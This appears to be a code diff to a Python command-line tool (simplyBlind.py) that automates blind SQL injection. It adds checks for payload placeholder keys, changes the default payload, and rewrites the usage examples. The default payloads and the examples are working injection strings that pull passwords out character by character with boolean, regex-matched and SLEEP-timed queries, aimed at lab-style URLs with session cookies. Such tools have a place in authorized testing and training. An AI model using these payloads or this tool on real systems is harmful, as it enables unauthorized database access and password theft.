@@ -27,8 +27,6 @@ class Check:
         if(timeout and mode == "to"):
               match = True
               verboseMassage = "--MATCHED: Timeout: TRUE"
-        elif(timeout):
-              match = False
         elif(mode == "nto"):
               match = True
               verboseMassage = "--MATCHED: Not Timeout: TRUE"
@@ -65,6 +63,19 @@ class Body:
         self.varyVerbose = varyVerbose 
 
     def makeBody(self, index, symbol, char): #_______________________________
+        if(self.payload.find("!I") < 0):
+            print("!I key is not set for custom payload")
+            exit()
+        if(self.payload.find("!S") < 0):
+            print("!S key is not set for custom payload")
+            exit()
+        if(self.payload.find("!C") < 0):
+            print("!C key is not set for custom payload")
+            exit()
+        if(self.body.find("!P") < 0):
+            print("!P key is not set for custom Body")
+            exit()
+        
         payload = self.payload.replace("!I", str(index))
         payload = payload.replace("!S", symbol)
         
@@ -348,11 +359,14 @@ Extracted: '<extracted strings>'
 ''')
 
 epi = """EXAMPLES:
-python main.py {atype} -p "0' AND BINARY SUBSTR(password, \!I, 1) \!S '\!C' #" -c '{{"PHPSESSID":"l0ishrnmb6annfe1iin11nrqr7", "security":"low"}}' -m reg --reg "User ID exists in the database\\." --get http://172.0.0.1/vulnerabilities/sqli_blind/
-\npython main.py {atype} -p 'admin\" AND BINARY SUBSTR(password, !I, 1) !S "!C" #' -b 'username=!P' -m reg --regex 'This user exists\.' --proxy-burp --header-fomrUrl --user john --passwd Password!23  http://testThatDontExist.come/uidFinder.php
-\npython main.py {atype} -p "10' AND IF(BINARY SUBSTR(password, \!I, 1) \!S '\!C', SLEEP(0.7), FALSE) #" -b 'value=!P' -c '{{"SID":"etc7stehjcs7c4kqaa6p6kit03"}}' --get -m to --timeout 0.5 http://notReal.wasd/login.php
+python simplyBlind.py {atype} -p "0' AND BINARY SUBSTR(password, \!I, 1) \!S '\!C' #" -c '{{"PHPSESSID":"l0ishrnmb6annfe1iin11nrqr7", "security":"low"}}' -m reg --reg "User ID exists in the database\\." --get http://172.0.0.1/vulnerabilities/sqli_blind/
+
+python simplyBlind.py {atype} -p 'admin\" AND BINARY SUBSTR(password, !I, 1) !S "!C" #' -b 'username=!P' -m reg --regex 'This user exists\.' --proxy-burp --header-fomrUrl --user john --passwd Password!23  http://172.0.0.1/uidFinder.php
+
+python simplyBlind.py {atype} -p "10' AND IF(BINARY SUBSTR(password, \!I, 1) \!S '\!C', SLEEP(0.7), FALSE) #" -b 'value=!P' -c '{{"SID":"etc7stehjcs7c4kqaa6p6kit03"}}' --get -m to --timeout 0.5 http://172.0.0.1/login.php
 
 TIP: for testing regex, you can use 'python file.py -s <attack type> --test --content | grep -E "regex expression"' to check for triggers.
+
 NOTE: for time based attacks, Set SLEEP() value to greater than normal response time and less then --timeout*2.
 """
 
@@ -369,7 +383,7 @@ quick.set_defaults(run=main)
 quick.set_defaults(brute=False)
 
 quick.add_argument('-b', '--body', default='id=!P&Submit=Submit', help='Set custom body. !P=payload. Payload key will be replaced with payload. DEFAULT: -b \'id=!P&Submit=Submit\'')
-quick.add_argument('-p', '--payload', default='\" OR BINARY SUBSTR(password, !I, 1) !S \'!C\' #', help='Set custom payload. !I = incrementer, !S = symbol, !C = Char. DEFAULT: -p "\' OR BINARY SUBSTR(password, !I, 1) !S \'!C\' #"')
+quick.add_argument('-p', '--payload', default='1\' AND BINARY SUBSTR(password, !I, 1) !S \'!C\' #', help='Set custom payload. !I = incrementer, !S = symbol, !C = Char. DEFAULT: -p "\' OR BINARY SUBSTR(password, !I, 1) !S \'!C\' #"')
 quick.add_argument('-m', '--mode', choices=['sc', 'redir', 'reg', 'to', 'nto'], help='Set the matching type identifier sc=status_codes, redir=rediracted, reg=regex, to=timeout, nto=not_timeout. DEFAULT: status_codes=200.')
 quick.add_argument('--regex', metavar='STRING', help='used if -m reg is used. EXAMPLE: --regex \'user accapted, walcome \\w+\'')
 quick.add_argument('-s', '--status', metavar='code', action='append', help='used if -m sc is used. EXAMPLE: -s 200 -s 203 -s 401')  
@@ -398,7 +412,7 @@ brute.set_defaults(run=main)
 brute.set_defaults(brute=True)
 
 brute.add_argument('-b', '--body', default='id=!P&Submit=Submit', help='Set custom body. !P=payload. Payload key will be replaced with payload. DEFAULT: -b \'id=!P&Submit=Submit\'')
-brute.add_argument('-p', '--payload', default='\" OR BINARY SUBSTR(password, !I, 1) !S \'!C\' #', help='Set custom payload. !I = incrementer, !S = symbol, !C = Char. DEFAULT: -p "\' OR BINARY SUBSTR(password, !I, 1) !S \'!C\' #"')
+brute.add_argument('-p', '--payload', default='1\' AND BINARY SUBSTR(password, !I, 1) !S \'!C\' #', help='Set custom payload. !I = incrementer, !S = symbol, !C = Char. DEFAULT: -p "\' OR BINARY SUBSTR(password, !I, 1) !S \'!C\' #"')
 brute.add_argument('-m', '--mode', choices=['sc', 'redir', 'reg', 'to', 'nto'], help='Set the matching type identifier sc=status_codes, redir=rediracted, reg=regex, to=timeout, nto=not_timeout. DEFAULT: status_codes=200.')
 brute.add_argument('--regex', metavar='STRING', help='used if -m reg is used. EXAMPLE: --regex \'user accapted, walcome \\w+\'')
 brute.add_argument('-s', '--status', metavar='code', action='append', help='used if -m sc is used. EXAMPLE: -s 200 -s 203 -s 401')  
